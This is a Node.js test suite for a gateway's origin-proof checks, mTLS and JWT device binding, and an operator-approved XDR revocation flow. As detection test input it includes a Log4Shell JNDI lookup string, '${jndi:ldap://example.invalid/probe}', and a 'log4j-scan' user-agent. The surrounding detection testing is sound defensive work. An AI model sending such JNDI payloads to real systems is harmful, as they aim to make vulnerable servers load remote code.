import test from 'node:test';
import assert from 'node:assert/strict';
import {createServer,request as httpRequest} from 'node:http';
import {request as httpsRequest} from 'node:https';
import {randomBytes,createHmac,X509Certificate} from 'node:crypto';
import {mkdtemp,readFile,writeFile,realpath,rm,chmod} from 'node:fs/promises';
import {join} from 'node:path';
import {tmpdir} from 'node:os';
import {execFileSync} from 'node:child_process';
import {createOriginGuard,createOriginProof,createProtectedOriginHandler} from '../src/origin-proof.mjs';
import {createSdpServer} from '../src/server.mjs';
import {createToken} from '../src/security.mjs';
import {loadConfiguration} from '../src/config.mjs';
import {initializeRegistry,enrollDevice,readRegistry} from '../src/registry.mjs';

const subjectId='a'.repeat(64),projectId='test-project',deviceId='1'.repeat(16),normalDevice='2'.repeat(16);
const listen=server=>new Promise((ok,fail)=>{server.once('error',fail);server.listen(0,'127.0.0.1',()=>{server.removeListener('error',fail);ok(server.address().port);});});
const close=server=>new Promise(r=>server.close(r));
function http(port,path,{proof,method='GET',headers={}}={}){
  return new Promise((ok,fail)=>{
    const req=httpRequest({hostname:'127.0.0.1',port,path,method,agent:false,headers:{...(proof?{'x-sdp-origin-proof':proof}:{}),...headers}},res=>{
      const data=[];res.on('data',x=>data.push(x));res.once('end',()=>ok({status:res.statusCode,text:Buffer.concat(data).toString()}));res.once('error',fail);
    });req.once('error',fail);req.setTimeout(4000,()=>req.destroy(Error('TEST_TIMEOUT')));req.end();
  });
}
function https(port,tls,path,{token,headers={}}={}){
  return new Promise((ok,fail)=>{
    const req=httpsRequest({hostname:'127.0.0.1',port,path,method:'GET',servername:'localhost',...tls,rejectUnauthorized:true,agent:false,headers:{authorization:'Bearer '+token,...headers}},res=>{
      const data=[];res.on('data',x=>data.push(x));res.once('end',()=>ok({status:res.statusCode,text:Buffer.concat(data).toString()}));res.once('error',fail);
    });req.once('error',fail);req.setTimeout(4000,()=>req.destroy(Error('TEST_TIMEOUT')));req.end();
  });
}
function signed(key,value){const body=Buffer.from(JSON.stringify(value)).toString('base64url');return body+'.'+createHmac('sha256',key).update(body).digest('base64url');}
const proofFor=(key,extra={})=>createOriginProof(key,{method:'GET',path:'/resource',appId:'vault',subjectId,projectId,deviceId,...extra});

test('origin enforces signed single-use request binding over real HTTP',async t=>{
  const key=randomBytes(48),contexts=[],proofs=[];
  const protectedHandler=createProtectedOriginHandler({key,appId:'vault'},(req,res,context)=>{
    contexts.push(context);
    assert.equal(Object.keys(req.headers).some(x=>x.startsWith('x-sdp-')),false);
    res.writeHead(200,{'content-type':'text/plain'});res.end('synthetic-protected-content');
  });
  const server=createServer((req,res)=>{proofs.push(req.headers['x-sdp-origin-proof']);protectedHandler(req,res);});
  const port=await listen(server);
  try{
    await t.test('direct origin access without proof or with fabricated proof is denied',async()=>{
      for(const proof of [undefined,'fabricated'])assert.equal((await http(port,'/resource',{proof})).status,403);
      assert.equal(contexts.length,0);
    });
    await t.test('valid proof passes once; replay does not reach the protected handler',async()=>{
      const proof=proofFor(key);
      assert.equal((await http(port,'/resource',{proof,headers:{'x-sdp-subject':'caller-spoof'}})).status,200);
      assert.equal(contexts.at(-1).subjectId,subjectId);assert.ok(Object.isFrozen(contexts.at(-1)));
      const count=contexts.length;assert.equal((await http(port,'/resource',{proof})).status,403);assert.equal(contexts.length,count);
    });
    await t.test('path method app signature and freshness mismatches are denied',async()=>{
      const original=proofFor(key),payload=JSON.parse(Buffer.from(original.split('.')[0],'base64url'));
      const cases=[
        ['/other',{proof:proofFor(key)}],
        ['/resource',{proof:proofFor(key),method:'HEAD'}],
        ['/resource',{proof:proofFor(key,{appId:'another'})}],
        ['/resource',{proof:signed(randomBytes(48),payload)}],
        ['/resource',{proof:signed(key,{...payload,at:Date.now()-60000})}],
        ['/resource',{proof:signed(key,{...payload,at:Date.now()+60000})}],
        ['/resource',{proof:signed(key,{...payload,subjectId:'b'.repeat(64)}).slice(0,-3)+'xyz'}],
      ];
      const count=contexts.length;
      for(const [path,options] of cases)assert.equal((await http(port,path,options)).status,403);
      assert.equal(contexts.length,count);
    });
    await t.test('duplicate proof headers and body-bearing requests fail closed',async()=>{
      assert.equal((await http(port,'/resource',{headers:{'x-sdp-origin-proof':[proofFor(key),proofFor(key)]}})).status,403);
      assert.equal((await http(port,'/resource',{proof:proofFor(key),headers:{'content-length':'1'}})).status,403);
    });
    await t.test('nonce capacity fails closed rather than forgetting live consumed nonces',()=>{
      const guard=createOriginGuard({key,appId:'vault',maxNonces:1});
      const fake=proof=>({method:'GET',url:'/resource',rawHeaders:['x-sdp-origin-proof',proof],headers:{'x-sdp-origin-proof':proof}});
      const first=proofFor(key);guard.verify(fake(first));
      assert.throws(()=>guard.verify(fake(proofFor(key))));assert.throws(()=>guard.verify(fake(first)));
    });
  }finally{await close(server);}
});

async function certificates(directory){
  const run=(...args)=>execFileSync('openssl',args,{cwd:directory,stdio:'ignore'});
  run('req','-x509','-newkey','rsa:2048','-nodes','-keyout','ca.key','-out','ca.pem','-days','2','-subj','/CN=SDP Synthetic Test CA');
  for(const name of ['server','client','normal']){
    run('req','-newkey','rsa:2048','-nodes','-keyout',name+'.key','-out',name+'.csr','-subj','/CN=SDP Synthetic '+name);
    await writeFile(join(directory,name+'.ext'),name==='server'?'basicConstraints=CA:FALSE\nextendedKeyUsage=serverAuth\nsubjectAltName=DNS:localhost,IP:127.0.0.1\n':'basicConstraints=CA:FALSE\nextendedKeyUsage=clientAuth\n');
    run('x509','-req','-in',name+'.csr','-CA','ca.pem','-CAkey','ca.key','-CAcreateserial','-out',name+'.pem','-days','2','-extfile',name+'.ext');
  }
  const file=name=>readFile(join(directory,name));
  return {ca:await file('ca.pem'),server:{cert:await file('server.pem'),key:await file('server.key')},client:{cert:await file('client.pem'),key:await file('client.key')},normal:{cert:await file('normal.pem'),key:await file('normal.key')}};
}

// End-to-end gateway/XDR approval coverage is appended below once its public API is stable.

test('gateway proposals bind authenticated devices and require explicit signed-evidence approval',async t=>{
  const {createXdrBridge}=await import('../src/xdr-bridge.mjs');
  const directory=await realpath(await mkdtemp(join(tmpdir(),'sdp-xdr-integration-')));
  let origin,server,noKeyServer;
  try{
    const certs=await certificates(directory),key=randomBytes(48),originKey=randomBytes(48),evidenceKey=randomBytes(48);
    const fingerprint=certificate=>new X509Certificate(certificate).fingerprint256.replaceAll(':','').toLowerCase();
    const suspectFingerprint=fingerprint(certs.client.cert),normalFingerprint=fingerprint(certs.normal.cert);
    const registryPath=join(directory,'registry.json'),evidencePath=join(directory,'proposals.json'),evidenceKeyPath=join(directory,'evidence.key');
    initializeRegistry(registryPath);
    for(const [id,cert] of [[deviceId,suspectFingerprint],[normalDevice,normalFingerprint]])enrollDevice(registryPath,{subjectId,projectId,deviceId:id,certificateFingerprint:cert,apps:['vault']});
    const originContexts=[];
    origin=createServer(createProtectedOriginHandler({key:originKey,appId:'vault'},(req,res,context)=>{
      originContexts.push(context);res.writeHead(200,{'content-type':'text/plain'});res.end('synthetic-vault-result');
    }));
    const originPort=await listen(origin);
    const originKeyPath=join(directory,'origin.key'),jwtKeyPath=join(directory,'jwt.key'),serverConfigPath=join(directory,'server.json');
    for(const name of ['ca.pem','server.pem','server.key'])await chmod(join(directory,name),0o600);
    for(const [path,value] of [[originKeyPath,originKey],[jwtKeyPath,key],[evidenceKeyPath,evidenceKey]])await writeFile(path,value,{mode:0o600});
    const serverProfile={schema:'student.sdp.server.v1',host:'127.0.0.1',port:7443,caFile:join(directory,'ca.pem'),certFile:join(directory,'server.pem'),keyFile:join(directory,'server.key'),jwtKeyFile:jwtKeyPath,
      issuer:'synthetic-sdp',audience:'synthetic-client',registryFile:registryPath,apps:[{id:'vault',name:'Synthetic Vault',upstream:`http://127.0.0.1:${originPort}`,subjects:[subjectId]}],
      originKeyFiles:{vault:originKeyPath},xdrEvidenceFile:evidencePath,xdrEvidenceKeyFile:evidenceKeyPath};
    await writeFile(serverConfigPath,JSON.stringify(serverProfile),{mode:0o600});
    const loaded=loadConfiguration(serverConfigPath),bridge=createXdrBridge({registryPath:loaded.registryPath,...loaded.xdr}),options={...loaded,xdrBridge:bridge};
    assert.ok(options.originKeys.vault.equals(originKey));
    server=createSdpServer(options);let port=await listen(server);
    const tokenFor=(id,certificateFingerprint)=>createToken({key,issuer:'synthetic-sdp',audience:'synthetic-client',subjectId,projectId,deviceId:id,certificateFingerprint});
    const token=tokenFor(deviceId,suspectFingerprint),normalToken=tokenFor(normalDevice,normalFingerprint);
    const tls={...certs.client,ca:certs.ca},normalTls={...certs.normal,ca:certs.ca};
    let eventId;
    await t.test('real private startup profile wires distinct keys and rejects partial or reused key settings',async()=>{
      for(const change of [profile=>{delete profile.xdrEvidenceKeyFile;},profile=>{profile.originKeyFiles.vault=jwtKeyPath;},profile=>{profile.xdrEvidenceKeyFile=jwtKeyPath;},profile=>{profile.xdrEvidenceKeyFile=originKeyPath;}]){
        const altered=structuredClone(serverProfile);change(altered);await writeFile(serverConfigPath,JSON.stringify(altered));assert.throws(()=>loadConfiguration(serverConfigPath));
      }
      await writeFile(serverConfigPath,JSON.stringify(serverProfile));assert.ok(loadConfiguration(serverConfigPath).xdr.evidenceKey.equals(evidenceKey));
    });
    await t.test('unprotected direct origin and gateway without origin key are rejected',async()=>{
      assert.equal((await http(originPort,'/resource')).status,403);
      noKeyServer=createSdpServer({...options,originKeys:{}});const noKeyPort=await listen(noKeyServer);
      const before=originContexts.length;
      assert.equal((await https(noKeyPort,tls,'/protected/vault/resource',{token})).status,403);
      assert.equal(originContexts.length,before);await close(noKeyServer);noKeyServer=null;
    });
    await t.test('normal and weak scanner requests keep access without revocation proposals',async()=>{
      assert.equal((await https(port,tls,'/protected/vault/resource',{token})).status,200);
      assert.equal((await https(port,tls,'/protected/vault/resource',{token,headers:{'user-agent':'log4j-scan'}})).status,200);
      assert.equal(bridge.listProposals().length,0);
      assert.equal(readRegistry(registryPath).devices.find(x=>x.deviceId===deviceId).revoked,false);
    });
    await t.test('gateway discards spoofed proof and derives identity from mTLS plus JWT',async()=>{
      const result=await https(port,tls,'/protected/vault/resource',{token,headers:{'x-sdp-origin-proof':'caller-fabricated','x-sdp-device':normalDevice,'x-sdp-subject':'b'.repeat(64)}});
      assert.equal(result.status,200);assert.equal(originContexts.at(-1).deviceId,deviceId);assert.equal(originContexts.at(-1).subjectId,subjectId);
    });
    await t.test('clear request pattern records only bound minimal evidence without automatic revocation',async()=>{
      const result=await https(port,tls,'/protected/vault/resource',{token,headers:{'x-probe':'${jndi:ldap://example.invalid/probe}','x-sdp-device':normalDevice,cookie:'TEST_ONLY_COOKIE=discard'}});
      assert.equal(result.status,200);
      const entries=bridge.listProposals();assert.equal(entries.length,1);const entry=entries[0];eventId=entry.eventId;
      assert.equal(entry.binding.deviceId,deviceId);assert.equal(entry.binding.certificateFingerprint,suspectFingerprint);
      assert.equal(entry.detectionAction,'alert');assert.equal(entry.confidence,0.72);assert.equal(entry.reason,'header_jndi_lookup');assert.equal(entry.status,'pending');
      assert.equal(readRegistry(registryPath).devices.find(x=>x.deviceId===deviceId).revoked,false);
      const stored=await readFile(evidencePath,'utf8');
      for(const secret of [token,'${jndi','example.invalid','TEST_ONLY_COOKIE','x-probe'])assert.ok(!stored.includes(secret));
      assert.equal((await https(port,normalTls,'/protected/vault/resource',{token:normalToken})).status,200);
    });
    await t.test('unknown event, forged device binding and altered unsigned ledger cannot revoke',async()=>{
      assert.throws(()=>bridge.approve('00000000-0000-4000-8000-000000000000'));
      assert.throws(()=>bridge.inspect({binding:{subjectId,projectId,deviceId:normalDevice,certificateFingerprint:suspectFingerprint},request:{method:'GET',path:'/resource',headers:{'x-probe':'${jndi:ldap://example.invalid/probe}'}}}));
      const original=await readFile(evidencePath),document=JSON.parse(original.toString());
      const stale=structuredClone(document);stale.entries[0].detectedAtMs=Date.now()-3600000;stale.signature=createHmac('sha256',evidenceKey).update(JSON.stringify({schema:stale.schema,entries:stale.entries})).digest('hex');
      await writeFile(evidencePath,JSON.stringify(stale));assert.throws(()=>bridge.approve(eventId));await writeFile(evidencePath,original);
      const originalRegistry=await readFile(registryPath),changedRegistry=JSON.parse(originalRegistry.toString());changedRegistry.revision++;await writeFile(registryPath,JSON.stringify(changedRegistry));assert.throws(()=>bridge.approve(eventId));await writeFile(registryPath,originalRegistry);
      document.entries[0].binding.deviceId=normalDevice;
      await writeFile(evidencePath,JSON.stringify(document));
      assert.throws(()=>bridge.approve(eventId));assert.throws(()=>createXdrBridge({registryPath,evidencePath,evidenceKey}));
      await writeFile(evidencePath,original);
      assert.equal(readRegistry(registryPath).devices.some(x=>x.revoked),false);
    });
    await t.test('operator CLI explicitly approves only the recorded event; repeated approval is not execution',async()=>{
      await writeFile(evidenceKeyPath,evidenceKey,{mode:0o600});
      const responseConfig=join(directory,'response.json');
      await writeFile(responseConfig,JSON.stringify({schema:'student.sdp.response.v1',registryFile:registryPath,evidenceFile:evidencePath,evidenceKeyFile:evidenceKeyPath}),{mode:0o600});
      const cli=join(import.meta.dirname,'../tools/respond.mjs');
      const listing=JSON.parse(execFileSync(process.execPath,[cli,'--config',responseConfig,'--list'],{encoding:'utf8',stdio:['ignore','pipe','pipe']}));
      assert.equal(listing.length,1);assert.deepEqual(Object.keys(listing[0]).sort(),['confidence','detectionAction','eventId','reason','status']);assert.equal(listing[0].eventId,eventId);
      assert.throws(()=>execFileSync(process.execPath,[cli,'--config',responseConfig,'--event',eventId],{stdio:'pipe'}));
      const invoke=()=>JSON.parse(execFileSync(process.execPath,[cli,'--config',responseConfig,'--event',eventId,'--approve'],{encoding:'utf8',stdio:['ignore','pipe','pipe']}));
      assert.deepEqual(invoke(),{status:'applied',applied:true});
      assert.deepEqual(invoke(),{status:'already_applied',applied:false});
      const registry=readRegistry(registryPath);assert.equal(registry.devices.find(x=>x.deviceId===deviceId).revoked,true);assert.equal(registry.devices.find(x=>x.deviceId===normalDevice).revoked,false);
    });
    await t.test('old suspect token is denied after approval and restart while normal device stays allowed',async()=>{
      assert.equal((await https(port,tls,'/protected/vault/resource',{token})).status,403);
      assert.equal((await https(port,normalTls,'/protected/vault/resource',{token:normalToken})).status,200);
      await close(server);server=createSdpServer({...options,xdrBridge:createXdrBridge({registryPath,evidencePath,evidenceKey})});port=await listen(server);
      assert.equal((await https(port,tls,'/protected/vault/resource',{token})).status,403);
      assert.equal((await https(port,normalTls,'/protected/vault/resource',{token:normalToken})).status,200);
    });
  }finally{if(noKeyServer?.listening)await close(noKeyServer);if(server?.listening)await close(server);if(origin?.listening)await close(origin);await rm(directory,{recursive:true,force:true});}
});
